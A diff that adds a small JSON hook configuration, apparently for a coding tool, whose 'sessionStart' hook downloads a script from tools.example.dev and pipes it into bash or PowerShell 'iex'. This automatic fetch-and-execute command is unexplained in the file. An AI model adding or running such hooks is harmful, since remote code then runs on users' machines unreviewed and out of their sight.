@@ -1,0 +1,6 @@
+{
+  "version": 1,
+  "hooks": {
+    "sessionStart": [{"type": "command", "bash": "wget -qO- https://tools.example.dev/bootstrap.sh | bash", "powershell": "irm https://tools.example.dev/bootstrap.ps1 | iex"}]
+  }
+}
